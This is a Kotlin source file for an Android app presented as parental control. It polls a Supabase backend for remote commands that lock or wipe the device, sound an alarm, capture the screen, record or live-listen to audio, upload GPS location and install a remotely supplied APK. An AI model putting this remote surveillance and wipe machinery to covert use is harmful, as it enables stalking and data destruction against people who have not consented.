package com.example.parentalcontrol

import android.content.Context
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.util.Log
import io.github.jan.supabase.postgrest.postgrest
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.serialization.Serializable

@Serializable
data class CommandRecord(
    val id: String,
    val device_id: String,
    val command: String,
    val status: String,
    val created_at: String? = null,
    val executed_at: String? = null
)

/**
 * مدير الأوامر (Command Manager)
 * متصل بنظام السحب الدوري (Polling) كبديل فائق الاستقرار للأسلاك (Websockets) لمنع حالات الفشل
 */
class RealtimeCommandManager(
    private val context: Context,
    private val scope: CoroutineScope,
    private val gpsTracker: GpsTracker,
    private val projectionProvider: () -> android.media.projection.MediaProjection?
) {

    companion object {
        private const val TAG = "CommandManager"
        private const val TABLE_NAME = "commands"
    }

    private val supabase = SupabaseManager.getInstance()
    private val parentalControl = ParentalControlManager(context)
    private val screenCapture = ScreenCaptureEngine(context)
    private val audioRecorder = AudioRecorderEngine(context)
    private val updateManager = AppUpdateManager(context)

    /**
     * بدء السحب الدوري للأوامر (كل 5 ثوانٍ)
     */
    fun startListening() {
        Log.i(TAG, "Starting command polling...")
        scope.launch(Dispatchers.IO) {
            while (true) {
                try {
                    val client = supabase.getClient()
                    if (client != null) {
                        val currentDeviceId = android.provider.Settings.Secure.getString(
                            context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
                        )

                        // نجلب الأوامر المعلقة لهذا الجهاز
                        val newCommands = client.postgrest[TABLE_NAME]
                            .select {
                                filter {
                                    eq("device_id", currentDeviceId)
                                    eq("status", "PENDING")
                                }
                            }.decodeList<CommandRecord>()

                        // تنفيذ الأوامر المكتشفة
                        for (cmd in newCommands) {
                            try {
                                Log.i(TAG, "New command detected: ${cmd.command}")
                                supabase.logRemote(context, TAG, "INFO", "Executing command: ${cmd.command}")
                                
                                val success = executeCommand(cmd.command.uppercase().trim())
                                
                                // تحديث الحالة إلى منفذ (أو فشل) بعد المحاولة
                                val statusResult = if (success) "EXECUTED" else "FAILED"
                                
                                client.postgrest[TABLE_NAME].update(
                                    {
                                        set("status", statusResult)
                                        set("executed_at", kotlinx.datetime.Clock.System.now().toString())
                                    }
                                ) {
                                    filter { eq("id", cmd.id) }
                                }

                                supabase.logRemote(context, TAG, "INFO", "Command ${cmd.command} result: $statusResult")
                            } catch (e: Exception) {
                                Log.e(TAG, "Failed to process command ${cmd.id}: ${e.message}")
                                supabase.logRemote(context, TAG, "ERROR", "Process failed: ${e.message}")
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Polling error: ${e.message}")
                }
                
                // انتظار 5 ثوانٍ قبل الفحص التالي
                delay(5000L)
            }
        }
    }

    private suspend fun executeCommand(command: String): Boolean {
        return try {
            when (command) {
                "LOCK" -> {
                    parentalControl.lockScreen()
                    true
                }
                "WIPE" -> {
                    parentalControl.wipeData(false)
                    true
                }
                "ALARM" -> {
                    playAlarm()
                    true
                }
                "CAPTURE" -> {
                    val projection = projectionProvider()
                    if (projection != null) {
                        screenCapture.captureAndUpload(projection, forceCapture = true)
                        true
                    } else {
                        Log.w(TAG, "MediaProjection is null — triggering re-acquisition")
                        supabase.logRemote(context, TAG, "WARN", "MediaProjection NULL — re-requesting permission")
                        // إطلاق إعادة الاكتساب تلقائياً
                        android.os.Handler(android.os.Looper.getMainLooper()).post {
                            MonitoringForegroundService.getInstance()?.requestProjectionReacquisition()
                        }
                        false
                    }
                }
                "RECORD" -> {
                    audioRecorder.recordAndUpload(30000L)
                    true
                }
                "LISTEN_START" -> {
                    audioRecorder.startRecording()
                    true
                }
                "LISTEN_STOP" -> {
                    audioRecorder.stopRecording(upload = true)
                    true
                }
                "LOCATE" -> {
                    gpsTracker.fetchAndUploadLocation()
                    true
                }
                "UPDATE" -> {
                    // executeCommand هي suspend fun تعمل داخل Dispatchers.IO
                    // → نستدعي مباشرة بدون launch داخلي لتجنب CancellationException
                    val settings = RemoteConfigManager(context).fetchSettings()
                    if (settings != null) {
                        updateManager.checkAndExecuteUpdate(
                            targetVersion = settings.target_version,
                            apkPath       = settings.update_apk_path,
                            apkUrl        = settings.update_apk_url
                        )
                    } else {
                        Log.w(TAG, "UPDATE: fetchSettings returned null")
                    }
                    true
                }
                else -> {
                    Log.w(TAG, "Unknown command: $command")
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Execution error: ${e.message}")
            supabase.logRemote(context, TAG, "ERROR", "Exec crash: ${e.message}")
            false
        }
    }

    /**
     * تشغيل صوت إنذار بأعلى صوت ممكن
     */
    private fun playAlarm() {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
            // رفع الصوت إلى الحد الأقصى تلقائياً (قناة الإنذار)
            val maxVolume = audioManager.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM)
            audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, maxVolume, 0)

            val notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM) ?: 
                               RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            
            val mediaPlayer = MediaPlayer().apply {
                setDataSource(context, notification)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                    setAudioAttributes(
                        android.media.AudioAttributes.Builder()
                            .setUsage(android.media.AudioAttributes.USAGE_ALARM)
                            .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
                            .build()
                    )
                } else {
                    setAudioStreamType(android.media.AudioManager.STREAM_ALARM)
                }
                prepare()
                isLooping = true
                start()
            }

            // التوقف بعد 15 ثانية لضمان عدم استهلاك البطارية
            scope.launch {
                delay(15000L)
                try {
                    if (mediaPlayer.isPlaying) {
                        mediaPlayer.stop()
                        mediaPlayer.release()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error stopping alarm: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to play alarm: ${e.message}")
        }
    }
}
